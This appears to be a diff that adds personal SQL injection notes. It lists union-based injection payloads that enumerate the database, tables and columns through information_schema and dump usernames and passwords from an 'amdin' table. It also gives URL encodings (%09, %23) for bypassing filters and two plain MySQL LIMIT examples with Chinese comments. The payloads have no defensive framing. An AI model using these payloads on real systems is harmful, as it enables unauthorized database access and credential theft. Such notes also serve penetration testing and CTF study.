@@ -1,0 +1,36 @@
+ union select order by n #
+
+ union select 1,2,3,4,5  #
+
+ union select database(),user() #
+
+ union select 1,group_concat(table_name) from information_schema.tables where table_schema='' #
+
+ union select 1,group_concat(column_name) from information_schema.columns where table_name='' #
+
+  union select 1,group_concat(username,password) from amdin #
+
+
+
+select * from Customer LIMIT 10 ;--检索前10行数据，显示1-10条数据
+
+
+select * from Customer limit 5,10 ;--检索从第6行开始向前加10条数据，共显示id为6,7....15
+
+%09   转换成空格的编码
+%23   转换成注释的编码
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
